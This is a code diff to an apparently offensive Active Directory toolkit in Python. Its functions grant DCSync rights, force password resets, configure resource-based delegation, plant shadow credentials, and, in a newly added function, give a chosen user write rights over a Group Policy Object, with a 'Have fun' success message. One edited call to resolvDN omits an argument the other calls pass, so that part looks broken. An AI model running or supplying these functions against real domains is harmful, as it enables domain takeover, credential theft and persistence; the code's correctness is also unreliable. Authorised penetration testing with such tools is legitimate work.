@@ -6,6 +6,7 @@ from dsinternals.system.DateTime import DateTime
 from dsinternals.common.data.hello.KeyCredential import KeyCredential
 
 from impacket.dcerpc.v5 import samr, transport
+from impacket.ldap import ldaptypes
 
 import logging
 
@@ -122,14 +123,15 @@ def addForeignObjectToGroup(conn, user_sid, group_dn):
     addMembersToGroups.ad_add_members_to_groups(conn, magic_user_dn, group_dn, raise_error=True)
 
 
-def addDomainSync(conn, sAMAccountName):
+def addDomainSync(conn, identity):
     """
     Give the right to perform DCSync with the user provided (You must have write permission on the domain)
     Args:
         sAMAccountName, DN, GUID or SID of the user
     """
+    user_dn = resolvDN(identity)
     # Query for the sid of our target user
-    conn.search(conn.server.info.other['rootDomainNamingContext'], '(sAMAccountName=%s)' % sAMAccountName, attributes=['objectSid'])
+    conn.search(user_dn, '(objectClass=*)', attributes=['objectSid'])
     user_sid = conn.entries[0]['objectSid'].raw_values[0]
 
 
@@ -137,7 +139,7 @@ def addDomainSync(conn, sAMAccountName):
     controls = ldap3.protocol.microsoft.security_descriptor_control(sdflags=0x04)
 
     # print_m('Querying domain security descriptor')
-    conn.search(conn.server.info.other['rootDomainNamingContext'], '(&(objectCategory=domain))', attributes=['SAMAccountName','nTSecurityDescriptor'], controls=controls)
+    conn.search(getDefaultNamingContext(conn), '(&(objectCategory=domain))', attributes=['nTSecurityDescriptor'], controls=controls)
     entry = conn.entries[0]
 
     secDescData = entry['nTSecurityDescriptor'].raw_values[0]
@@ -156,14 +158,14 @@ def addDomainSync(conn, sAMAccountName):
     conn.modify(dn, {'nTSecurityDescriptor':(ldap3.MODIFY_REPLACE, [data])}, controls=controls)
 
 
-def changePassword(conn, target, new_pass):
+def changePassword(conn, identity, new_pass):
     """
     Change the target password without knowing the old one using LDAPS
     Args: 
         sAMAccountName, DN, GUID or SID of the target (You must have write permission on it)
         new password for the target
     """
-    target_dn = resolvDN(conn, target)
+    target_dn = resolvDN(conn, identity)
 
     modifyPassword.ad_modify_password(conn, target_dn, new_pass, old_password=None)
     if conn.result['result'] == 0:
@@ -224,14 +226,14 @@ def rpcChangePassword(domain, username, password, hostname, target, new_pass):
 # TODO: Add Computer
 # TODO: Write GPO DACL
 
-def setRbcd(conn, spn_sid, target):
+def setRbcd(conn, spn_sid, target_identity):
     """
     Give Resource Based Constraint Delegation (RBCD) on the target to the SPN provided
     Args: 
         object sid of the SPN (Controlled by you)
         sAMAccountName, DN, GUID or SID of the target (You must have DACL write on it)
     """
-    target_dn = resolvDN(conn, target)
+    target_dn = resolvDN(conn, target_identity)
 
     entries = conn.search(getDefaultNamingContext(conn), '(sAMAccountName=%s)' % spn_sid, attributes=['objectSid'])
     try:
@@ -256,7 +258,7 @@ def setRbcd(conn, spn_sid, target):
     except IndexError:
         # Create DACL manually
         sd = createEmptySD()
-    sd['Dacl'].aces.append(create_allow_ace(spn_sid))
+    sd['Dacl'].aces.append(createACE(spn_sid))
     conn.modify(targetuser['dn'], {'msDS-AllowedToActOnBehalfOfOtherIdentity':[ldap3.MODIFY_REPLACE, [sd.getData()]]})
     if conn.result['result'] == 0:
         LOG.info('Delegation rights modified succesfully!')
@@ -283,7 +285,7 @@ def setShadowCredentials(conn, sAMAccountName):
     keyCredential = KeyCredential.fromX509Certificate2(certificate=certificate, deviceId=Guid(), owner=target_dn, currentTime=DateTime())
     LOG.debug("KeyCredential generated with DeviceID: %s" % keyCredential.DeviceId.toFormatD())
     LOG.debug("KeyCredential: %s" % keyCredential.toDNWithBinary().toString())
-    conn.search(target_dn, '(objectClass=*)', search_scope=ldap3.BASE, attributes=['SAMAccountName', 'objectSid', 'msDS-KeyCredentialLink'])
+    conn.search(target_dn, '(objectClass=*)', search_scope=ldap3.BASE, attributes=['msDS-KeyCredentialLink'])
     results = None
     for entry in conn.response:
         if entry['type'] != 'searchResEntry':
@@ -347,8 +349,38 @@ def accountdisable(conn, identity, enable):
     Enable or disable the target account by setting the ACCOUNTDISABLE flag in the UserAccountControl attribute
     You must have write permission on the UserAccountControl attribute of the target
     Args:
-    sAMAccountName, DN, GUID or SID of the target
-    set the flag on the UserAccountControl attribute 
+        sAMAccountName, DN, GUID or SID of the target
+        set the flag on the UserAccountControl attribute 
     """
     UF_ACCOUNTDISABLE = 2
     userAccountControl(conn, identity, enable, UF_ACCOUNTDISABLE)
+
+def modifyGpoACE(conn, identity, gpo):
+    """
+    Give permission to a user to modify the GPO
+    Args:
+        sAMAccountName, DN, GUID or SID of the user
+        name of the GPO (ldap name)
+    """
+    user_dn = resolvDN(conn, identity)
+    conn.search(user_dn, '(objectClass=*)', attributes=['objectSid'])
+    user_sid = conn.entries[0]['objectSid'].raw_values[0]
+
+    controls = ldap3.protocol.microsoft.security_descriptor_control(sdflags=0x04)
+    conn.search(getDefaultNamingContext(conn), '(&(objectclass=groupPolicyContainer)(name=%s))' % gpo, attributes=['nTSecurityDescriptor'], controls=controls)
+
+    if len(conn.entries) <= 0:
+        raise NoResultError(getDefaultNamingContext(conn), '(&(objectclass=groupPolicyContainer)(name=%s))' % gpo)
+    gpo = conn.entries[0]
+
+    secDescData = gpo['nTSecurityDescriptor'].raw_values[0]
+    secDesc = ldaptypes.SR_SECURITY_DESCRIPTOR(data=secDescData)
+    newace = createACE(user_sid)
+    secDesc['Dacl']['Data'].append(newace)
+    data = secDesc.getData()
+
+    conn.modify(gpo.entry_dn, {'nTSecurityDescriptor':(ldap3.MODIFY_REPLACE, [data])}, controls=controls)
+    if conn.result["result"] == 0:
+        LOG.info('LDAP server claims to have taken the secdescriptor. Have fun')
+    else:
+        raise ResultError(conn.result)
